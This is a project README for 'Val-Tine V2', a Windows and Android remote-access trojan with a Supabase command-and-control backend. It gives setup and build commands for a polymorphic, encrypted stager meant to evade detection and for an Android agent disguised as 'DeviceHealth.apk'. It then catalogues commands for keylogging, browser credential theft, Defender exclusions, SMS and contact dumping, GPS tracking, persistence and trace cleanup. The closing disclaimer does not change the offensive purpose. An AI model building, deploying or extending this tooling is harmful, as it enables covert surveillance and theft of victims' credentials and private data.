# Val-Tine V2

Cross-platform remote administration tool with a Supabase C2 backend. Targets Windows and Android with a React web dashboard for control.

```
┌──────────────┐     ┌──────────────┐     ┌──────────────┐
│   Dashboard   │────▶│   Supabase   │◀────│    Agent     │
│   (React)     │     │   (C2 API)   │     │  (Go binary) │
└──────────────┘     └──────────────┘     └──────────────┘
                           ▲
                           │
                     ┌─────┴─────┐
                     │   Edge     │
                     │ Functions  │
                     └───────────┘
```

**Windows Agent** — Go binary with a 4-stage polymorphic VM stager
**Android Agent** — Go binary packaged as a native library inside a signed APK
**Dashboard** — React + Vite web panel backed by Supabase (Postgres, REST API, Edge Functions, Storage)

---

## Requirements

| Dependency | Version | Purpose |
|-----------|---------|---------|
| [Python](https://python.org/) | 3.8+ | Setup wizard and build scripts |
| [Go](https://go.dev/dl/) | 1.21+ | Agent compilation |
| [Node.js](https://nodejs.org/) | 18+ | Supabase CLI and dashboard |
| [Supabase CLI](https://supabase.com/docs/guides/cli) | latest | DB migrations and edge function deploys |

**Additional for Android builds:**

| Dependency | Version | Purpose |
|-----------|---------|---------|
| [Java JDK](https://adoptium.net/) | 11+ | APK signing (`keytool`, `jarsigner`) |
| [Gradle](https://gradle.org/install/) | 8.x | APK build system |
| [Android SDK](https://developer.android.com/studio) | SDK 34 | Build tools, platform libraries |

> `setup.py` checks for missing dependencies at startup and can auto-install them using your system package manager (apt, dnf, pacman, brew, winget, choco).

---

## Setup

```bash
python3 setup.py
```

The setup wizard will:
1. **Check dependencies** — detect missing tools and offer to install them
2. **Collect config** — Supabase URL, anon key, optional secondary project, webhook URL
3. **Create dashboard user** — Supabase Auth user for the web panel
4. **Run Supabase CLI** — login, link project, push migrations, deploy edge functions
5. **Build payloads** — optionally build Windows EXE and/or Android APK

After setup, start the dashboard:

```bash
npm install
npm run dev
```

Open `http://localhost:5173` and log in.

---

## Building Payloads

### Windows

```bash
python3 obfus.py
# or rebuild quickly:
python3 setup.py build
```

4-stage polymorphic pipeline:
1. Compile Go agent → dual-layer encrypt (XOR + RC4) → upload to temp hosting
2. Shorten payload URL via Supabase edge function
3. Generate polymorphic VM bytecode with randomized opcodes
4. Generate polymorphic Go stager → compile to EXE

Every build produces a unique binary with different opcodes, identifiers, encryption keys, and junk code.

### Android

```bash
python3 build_android.py
```

Or with explicit config:

```bash
python3 build_android.py --domain yourproject.supabase.co --apikey eyJ...
```

| Flag | Default | Description |
|------|---------|-------------|
| `--domain` | from `.env` | Primary Supabase domain |
| `--domain2` | — | Secondary domain (redundancy) |
| `--apikey` | from `.env` | Supabase anon key |
| `--arch` | `arm64` | Target: `arm64`, `arm`, `x86_64`, `x86` |
| `--output` | `DeviceHealth.apk` | Output filename |

Build stages:
1. Compile Go agent for `android/{arch}` with injected C2 config
2. Package as `libagent.so` in APK via Gradle
3. Sign with debug keystore + v2 apksigner

Install: `adb install DeviceHealth.apk`

> Set `ANDROID_HOME` env var or the builder auto-detects from `~/Android/Sdk`, `/usr/lib/android-sdk`, etc.

---

## Agent Commands

### Common (Windows + Android)

| Command | Description |
|---------|-------------|
| `ping` | Connection test |
| `shell` | Execute shell command |
| `sysinfo` | System information |
| `isadmin` | Check privileges |
| `screenshot` | Single screenshot |
| `screenshots` | Continuous screenshots (background) |
| `microphone` | Record audio |
| `wifi` | WiFi info and saved networks |
| `download` | Download file from target |
| `upload` | Upload file to target |
| `exfiltrate` | Bulk file exfiltration |
| `foldertree` | Directory listing |
| `persist` | Install persistence |
| `unpersist` | Remove persistence |
| `cleanup` | Clear traces |
| `sleep` | Sleep N seconds |
| `antianalysis` | VM/debugger detection report |
| `jobs` | List active background jobs |
| `kill` | Stop a background job |
| `pausejobs` | Stop all jobs |
| `resumejobs` | Resume default jobs |
| `options` | Show available commands |
| `exit` | Kill agent |

### Windows Only

| Command | Description |
|---------|-------------|
| `elevate` | UAC elevation |
| `excludec` | Defender exclusion for C:\\ |
| `excludeall` | Defender exclusions C:-G:\\ |
| `webcam` | Webcam capture |
| `keycapture` | Keylogger |
| `recordscreen` | Screen recording |
| `browserdb` | Exfiltrate browser databases |
| `parsebrowser` | Extract browser URLs/logins |
| `nearbywifi` | Scan nearby WiFi networks |
| `enumeratelan` | LAN discovery (ping sweep) |
| `message` | Show message box |
| `wallpaper` | Change wallpaper |
| `darkmode` / `lightmode` | Toggle system theme |
| `shortcutbomb` | Create desktop shortcuts |
| `fakeupdate` | Open fake update page |
| `soundspam` | Play system sounds |

### Android Only

| Command | Description |
|---------|-------------|
| `contacts` | Dump contacts |
| `sms_dump` | Dump SMS messages |
| `calllog` | Dump call log |
| `apps` | List installed apps |
| `location` | Last known location |
| `location_track` | Continuous GPS tracking |
| `clipboard` | Read clipboard |
| `camera` | Take photo |
| `toast` | Show toast message |
| `openurl` | Open URL in browser |
| `vibrate` | Vibrate device |

---

## Project Structure

```
Val-Tine-V2/
├── setup.py                # Setup wizard (config + dependency check + builds)
├── obfus.py                # Windows polymorphic builder
├── build_android.py        # Android APK builder
├── main.go                 # Windows agent source
├── .env                    # Supabase config (generated by setup.py)
├── src/                    # React dashboard
│   ├── pages/
│   │   ├── Dashboard.tsx
│   │   └── Client.tsx
│   ├── hooks/
│   ├── lib/
│   └── components/
├── android/                # Android APK project
│   ├── agent/main.go       # Android Go agent
│   ├── app/
│   │   ├── build.gradle
│   │   └── src/main/
│   │       ├── AndroidManifest.xml
│   │       └── java/.../
│   │           ├── MainActivity.java
│   │           ├── AgentService.java
│   │           └── BootReceiver.java
│   ├── build.gradle
│   ├── gradle/
│   └── settings.gradle
└── supabase/               # Migrations & edge functions
    ├── migrations/
    └── functions/
```

---

## Disclaimer

This tool is provided for authorized security testing and educational purposes only. Unauthorized access to computer systems is illegal. The authors assume no liability for misuse.
